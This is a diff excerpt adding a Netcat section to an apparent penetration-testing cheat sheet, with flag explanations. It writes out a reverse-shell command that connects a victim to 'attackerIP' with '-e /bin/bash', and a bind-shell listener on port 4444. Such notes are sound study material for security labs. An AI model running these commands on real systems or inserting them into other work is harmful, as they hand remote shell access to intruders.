@@ -473,3 +473,25 @@ add -D metasploitable.localdomain to guess valid email address instead of user n
 ```
 
 
+# Netcat
+```
+nc -nv 192.168.0.22 80
+```
+-n           numeric-only IP addresses, no DNS  
+-v           verbose [use twice to be more verbose]  
+
+if victim execute this, it will connect to attacker's listening nc, and provide shell to him
+```
+nc -nv attackerIP port -e /bin/bash
+```
+
+## Listening
+Victim listening on port, whoever connect to it will gain the shell
+```
+nc -nvlp 4444 -e /usr/bin/bash
+```
+-l listening  
+-p port   
+-e filename             program to exec after connect \[dangerous!!]  
+
+
